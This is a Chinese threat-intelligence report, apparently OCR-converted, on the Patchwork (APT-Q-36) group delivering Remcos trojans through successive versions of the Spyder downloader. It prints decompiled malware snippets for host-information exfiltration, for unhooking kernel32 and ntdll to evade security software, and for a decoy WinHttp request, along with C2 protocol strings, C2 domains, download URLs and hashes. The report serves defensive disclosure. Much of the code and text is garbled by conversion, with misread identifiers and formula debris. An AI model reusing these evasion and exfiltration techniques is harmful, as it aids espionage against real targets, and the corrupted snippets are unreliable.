@@ -1,0 +1,189 @@
+# 摩诃草组织（APT-Q-36）借Spyder下载器投递Remcos木马  
+
+原创威胁情报中心奇安信威胁情报中心2023-11-2810:25发表于四川  
+
+## I团伙背景  
+
+摩诃草，又名Patchwork、白象、Hangover、Dropping Elephant等，奇安信内部跟踪编号APT-Q-36。该组织被普遍认为具有南亚地区背景，其最早攻击活动可追溯到2009年11月，已持续活跃10余年。该组织主要针对亚洲地区的国家进行网络间谍活动，攻击目标包括政府、军事、电力、工业、科研教育、外交和经济等领域的组织机构。  
+
+## I事件概述  
+
+Spyder恶意软件与摩诃草组织存在关联I1l，主要功能是下载并运行C2服务器下发的可执行文件。奇安信威胁情报中心观察到自7月以来，Spyder至少经过了两轮更新，并发现攻击者借助Spyder向目标主机植入Remcos木马。根据捕获的恶意样本，相关攻击活动有如下特点：  
+
+1.Spyder下载器中一些关键字符串不再以明文形式出现，而是经过异或加密处理，以避开静态检测，同时恶意软件与C2服务器的通信数据格式也做了调整;  
+2.植入的Remcos木马采用的都是当时能获取到的最新版  
+3.通过Spyder样本的名称和配置信息，可以推测受害者包括巴基斯坦、孟加拉国、阿富汗等国的目标。  
+
+## I详细分析  
+
+捕获到的Spyder和Remcos样本基本信息如下：  
+
+<html><body><table><tr><td>MD5</td><td>创建时间</td><td>数字签名时间戳</td><td>类型</td></tr><tr><td>05e59dcc5f4b657696a 92fd2b3eac90d</td><td>2023-07-09 17:05: 45 UTC</td><td>2023-07-1107:14:37 UT C</td><td>Spyder v1</td></tr><tr><td>2491942d8cd5807cd46 15a07ad26a54a</td><td>2023-08-11 13:57:1 6 UTC</td><td>2023-08-1409:59:22 UT C</td><td>Spyder v2</td></tr><tr><td>6699190f7f657402943 2b2678e1f40ac</td><td>2023-09-09 18:49: 44 UTC</td><td>2023-09-2007:59:23UT C</td><td>Spyder v3</td></tr><tr><td>bc743f1b24e8e585e88 9d77099ad0ac2</td><td>2023-10-09 08:26: 21 UTC</td><td>2023-10-11 06:42:28 UT C</td><td>Spyder v3</td></tr><tr><td>656b523031d9ffda7b8 b1740542b653c</td><td>2023-10-09 08:26: 21 UTC</td><td>2023-10-11 07:08:13 UT C</td><td>Spyder v3</td></tr><tr><td>57b805f4c496c5d25ac be45bfaf7ee11</td><td>2023-06-24 16:04: 14 UTC</td><td>2023-07-04 07:12:16 UT C</td><td>Remcosv4.8.0Pro</td></tr><tr><td>68f4f27219840b4ba86 462241f740bbd</td><td>2023-06-15 17:58: 26 UTC</td><td>2023-08-05 07:49:12 UT C</td><td>Remc0s v4.9.0 Pro</td></tr><tr><td>5eae3dee275dbca878d 145817707597f</td><td>2023-06-15 17:58: 26 UTC</td><td>2023-08-31 10:27:56 UT C</td><td>Remcos v4.9.1Pro</td></tr></table></body></html>  
+
+以上样本使用的数字签名有3个：  
+
+<html><body><table><tr><td>签名者名称 序列号</td><td></td></tr><tr><td>GREATIVLIMITED</td><td></td></tr><tr><td>SYNTHETICLABSLIMI TED</td><td>1966BC76BDA1A708334792DA9A336F69</td></tr><tr><td>RUNSWITHSCISSORS SL TD</td><td>424F085F4216FD917A4B0BE96982A4D9</td></tr></table></body></html>
+
+https://mp.weixin.qq.com/s/cew83Kzo6omopGIPG-qgxw  
+
+# 常规 高级  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/86a88669661b39629f69dec552103f03ccac98127350a6908c003e512479020d.jpg)  
+
+### 数宇签名信息  
+
+此数字签名正常。  
+
+#### 签名者信息(S)  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/7c72b2c13554b393850a21c56453caab3e14a02dd481caf26f9de8955563d05d.jpg)  
+
+### 数字签名信息  
+
+此数字签名正常。  
+
+#### 签名者信息(S)  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/376d008b3dde5bf182d7254aa94b18bd70db242ab6d331eb72bb677d0833c182.jpg)  
+
+### 数宇签名信息  
+
+此数字签名正常。  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/300f965a7b17c3c423fa2acb876c74960735a3e86118e8a60bafc146420a163c.jpg)  
+
+## Spyder的更新  
+
+### 1. version2  
+
+与版本1相比，版本2将一些明文字符串（比如API名称和收集主机信息的格式化字符串)进行了异或加密。  
+
+(1）API名称  
+
+v134[0] $=$ v4;   
+v134[1] $=$ retaddr;   
+$v5=$ alloca(20772);   
+SizeofResource $\Bumpeq$ (DWORD (_stdcall \*)(HMODULE,HRSRC))GetModuleHandleW(L"kerne132.dl1");   
+FindResourceW $=$ (HRSRC(stdcall \*)(HMODULE,LPCWSTR,LPCWSTR))GetProcAddress( (HMODULE)SizeofResource, "FindResourceW");   
+LoadResource $=$ (HGLOBAL (_stdcall \*)(HMODULE, HRSRC))GetProcAddress((HMODULE)SizeofResource,"LoadResource");   
+SizeofResource $=$ (DWORD (stdcall \*)(HMODULE, HRSRC))GetProcAddress((HMODULE)SizeofResource, "SizeofResource");   
+v6 $=$ (HRSRC)((int (_cdecl \*)(_DWORD, const wchar_t \*, const wchar_t \*))FindResourceW)(0, L"TRUETYPE", L"FONTS");   
+v7 $=$ v6;   
+if（v6） Spyderv1 v9 ${}={}$ LoadResource(0,v6); Size $=$ SizeofResource(0, v7); MD5:05e59dcc5f4b657696a92fd2b3eac90d v115[0] $=$ GlobalAlloc(0x40u, Size + 1);  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/962e40b39a06d442699daa2db9b7b107a392d12f3d019931371e9ca42b0ee0fb.jpg)  
+
+### (2）收集主机信息的格式化字符串  
+
+if （dword_452918） wsprintfA( v28, "hwid=%s&username=%s&compname=%s&osname=%s&arch=1&av=%s&agent=%i&profile=%s&mail=%s", g_encode_machine_guid, dword_456D30, dword_456D34, dword_456D3C, dword_456B28, \*(_DWORD \*)g_config_data_ptr, v131, v132);   
+else wsprintfA( v28, "hwid=%s&username=%s&compname=%s&osname=%s&arch=0&av=%s&agent=%i&profile=%s&mail=%s", g_encode_machine_guid, dword_456D30, dword_456D34, dword_456D3C, dword_456B28, \*(_DWORD \*)g_config_data_ptr, Spyder v1 v131, MD5:05e59dcc5f4b657696a92fd2b v132);  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/618c5812634bc5abb9c2070fc1fbc3ce9e38df1416dc85a786b29c31eedf9fc6.jpg)  
+
+Spyder在回传收集的主机信息前，会与C2服务器进行第一次交互，如果响应数据为"1"，版本1进入休眠死循环，而版本2改为退出进程。  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/7c80f7278740a6ace29704a35fae25aee6fd3223d6ac5ce410bec6ea8a9538a6.jpg)  
+
+此外，版本2在POST请求的数据末尾添加 ${}^{\prime\prime}\&\mathsf{v e r}=2\prime\prime$ 。下面是Spyder样本根据C2指令部署后续可执行文件时，版本1和版本2构造请求数据所用的格式化字符串。  
+
+<html><body><table><tr><td></td><td>Spyder v1</td><td>Spyder v2</td></tr><tr><td>获取C2指令</td><td>hwid=%s&deploy=1</td><td>hwid=%s&deploy=1&ver=2</td></tr></table></body></html>  
+
+摩诃草组织（APT-Q-36）借Spyder下载器投递Remcos木马  
+
+
+<html><body><table><tr><td>获取下载文 件信息</td><td>hwid=%s&deploy=%d &bakmout=1</td><td>hwid=%s&deploy=2&type=%d&ver=2</td></tr><tr><td>部署完成</td><td>hwid=%s&deploy=0</td><td>hwid=%s&deploy=3&type=%d&ver=2</td></tr></table></body></html>  
+
+### 2. version3  
+
+版本3最大的变动是以JSON字符串的形式表示与C2服务器交互的数据，并且在其中添加version为3的信息。  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/1c99b3844ec0b3561150d872861976df4c881554620b70d903cd1b1127046b21.jpg)  
+
+JSON字符串再经过base64编码，拼接在字符串"data $=$ "后，作为POST请求的数据。  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/eecd8ea3eb3225058fcf1e938365307d14178c61e79efd70930830d74a2231b3.jpg)  
+
+## Remcos木马  
+
+在请求C2服务器的指令循环中，Spyder除了根据下发的指令部署后续可执行文件，还会在循环一开始从配置数据中的URL拉取一个可执行文件。  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/a037272b4697c0a54338153d1d170d7c7c133da9b7963cba25e4823709cfb43b.jpg)  
+
+Spyder v1  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/cb493d217f3aa622f085a7650ff319b17103a4c06f698539e7cbb5590a3efe42.jpg)  
+
+Spyder v2 & v3  
+
+我们观察到有两个Spyder样本通过这种方式下载了Remcos木马。  
+
+<html><body><table><tr><td>SpyderMD 5</td><td>05e59dcc5f4b657696a92fd2b3 eac90d</td><td>2491942d8cd5807cd4615a07ad26a54a</td></tr></table></body></html>  
+
+<html><body><table><tr><td>下载URL</td><td>hxxp://mfaturk.com/backup/in c.php</td><td>hxxp://mfaturk.com/hing9/dmw.php</td></tr><tr><td>RemcosMD 5</td><td>68f4f27219840b4ba86462241f 740bbd</td><td>5eae3dee275dbca878d145817707597f</td></tr></table></body></html>  
+
+两个Remcos木马加载的方式相同。首先重新在内存中映射kernel32.dll和ntdll.dll的.text段，解除防护软件对这两个模块中的函数的监控。  
+
+$\begin{array}{r l}{\mathbf{\nabla}\mathbf{\times}\mathbf{1}}&{{}=}\end{array}$ GetModuleHandleW(lpModuleName);   
+memset(Buffer, 0, sizeof(Buffer));   
+GetSystemDirectoryW(Buffer, Ox10oou);   
+lstrcatW(Buffer, &String2);   
+lstrcatW(Buffer, lpModuleName);   
+hLibModule $\begin{array}{r l}{\mathbf{\tau}}&{{}=\mathbf{\tau}\mathbf{v}\mathbf{1}}\end{array}$   
+K32GetModuleInformation(hProcess, v1, &modinfo, OxCu);   
+$v2=$ modinfo.1pBase0fDll;   
+hobject $\equiv$ CreateFileW(Buffer, 0x80000000, 1u, 0, 3u, 0, 0);   
+v11 $\Bumpeq$ CreateFileMappingW(h0bject, 0, 0x1000002u, 0, 0, 0);   
+v14 $=$ (char \*)MapViewOfFile(v11, 4u,0,0,0);   
+$\vee7~=~\vee2$   
+v9 $=$ v2[15];   
+v8 = \*(WORD \*)((char \*)v2 + v9 + 6);   
+if（v8） v3 =(int)v2+v9+24; for（i=0;i<v8;++i） { v5 = v3 + \*(unsigned _int16 \*)((char \*)v7 + v9 + 20); if （!strcmp((const char \*)v5,".text")) { fl0ldProtect = 0; VirtualProtect((char \*)v7 + \*(_DWORD \*)(v5 + 12), \*(_DWORD \*)(v5 + 8), 0x40u, &fl0ldProtect); memmove((char \*)v7+\*(_DWORD \*)(v5 + 12)，&v14[\*(_DWORD \*)(v5 +12)]，\*(_DWORD \*)(v5 + 8)); VirtualProtect(char \*)v7 + \*(_DWORD \*)(v5 + 12), \*(_DWORD \*)(v5 + 8), f101dProtect, &f101dProtect); v8= \*(_WORD \*)((char \*)v7 +v9 + 6); v3 += 40; 向"www[.]wingtiptoys.com"发送HTTP请求以混淆真实通信流量。   
+result $=$ WinHttpOpen(&pszAgentW，0，0，0，0);   
+if （result）   
+{ $\begin{array}{r l}{\vee1}&{{}=}\end{array}$ result; $\downarrow2=$ WinHttpConnect(result,L"www.wingtiptoys.com", 0x50u, 0); if（v2） { $\vee3=\vee2$ v4 $=$ WinHttpOpenRequest(v2,&pwszVerb,&pwszObjectName,0,0,0,0); if（v4） { $\vee5=\vee4$ WinHttpSendRequest(v4，0,0,0，0,0,0); WinHttpCloseHandle(v5); WinHttpCloseHandle(v3); result $=$ (void \*)WinHttpCloseHandle(v1);   
+return result;  
+
+加载资源数据，进行RC4解密，得到Remcos木马的文件数据，然后内存加载执行。使用的解密密钥如下：  
+
+Remcos木马的C2配置信息如下：  
+
+![](https://cdn-mineru.openxlab.org.cn/extract/c72493b1-e094-4788-9526-327a92ad2397/65c60071f4d8c04661ff40e282efa80072361665bc53682f2bd75ab5fc3ad4a8.jpg)  
+
+以0x1E为分隔符，共有3组，不过后面两个域名目前没有对应的解析IP，所以实际上有效的只有morimocanab.com。  
+
+morimocanab.com:443   
+grand123099ggcarnivol.com:443   
+Omeri12oncloudd.com:443  
+
+## I总结  
+
+在短短几个月时间内，Spyder下载器已经历了数次更新，由此可见攻击团伙为避开安全防护软件检测，完成情报窃取任务的决心。从功能上看，Spyder作为通用下载器，可以用来在受害者主机上部署任意可执行文件，此次发现的Spyder被用于投递Remcos木马可能只是涉及该下载器组件的攻击链的冰山一角，奇安信威胁情报中心将持续关注相关APT组织的攻击活动。  
+
+## I防护建议  
+
+奇安信威胁情报中心提醒广大用户，谨防钓鱼攻击，切勿打开社交媒体分享的来历不明的链接，不点击执行未知来源的邮件附件，不运行标题夸张的未知文件，不安装非正规途径来源的APP。做到及时备份重要文件，更新安装补丁。  
+
+若需运行，安装来历不明的应用，可先通过奇安信威胁情报文件深度分析平台（https://sandbox.ti.qianxin.com/sandbox/page）进行判别。目前已支持包括Windows、安卓平台在内的多种格式文件深度分析。  
+
+目前，基于奇安信威胁情报中心的威胁情报数据的全线产品，包括奇安信威胁情报平台（TIP）、天擎、天眼高级威胁检测系统、奇安信NGSOC、奇安信态势感知等，都已经支持对此类攻击的精确检测。  
+
+#  
+
+### MD5  
+
+(Spyder) 05e59dcc5f4b657696a92fd2b3eac90d 2491942d8cd5807cd4615a07ad26a54a 6699190f7f6574029432b2678e1f40ac bc743f1b24e8e585e889d77099ad0ac2 656b523031d9ffda7b8b1740542b653c (Remcos) 57b805f4c496c5d25acbe45bfaf7ee11  
+
+68f4f27219840b4ba86462241f740bbd   
+5eae3dee275dbca878d145817707597f  
+
+### c&C  
+
+mfaturk.com firebasebackups.com morimocanab.com:443 grand123099ggcarnivol.com:443 omeri12oncloudd.com:443  
+
+### URL  
+
+hxxp://mfaturk.com/backup/manage.php hxxp://mfaturk.com/backup/inc.php hxxp://mfaturk.com/hing9/includes.php hxxp://mfaturk.com/hing9/dmw.php hxxp://mfaturk.com/hailo/stick.php hxxp://mfaturk.com/hailo/dmw.php hxxp://firebasebackups.com/hailo/load_img.php hxxp://firebasebackups.com/hailo/pakart.php  
+
+## I参考链接  
+
+[1].https://ti.qianxin.com/blog/articles/Suspected-Patchwork-Utilizing-WarHawk-B ackdoor-Variant-Spyder-for-Espionage-on-Multiple-Nations-CN/  
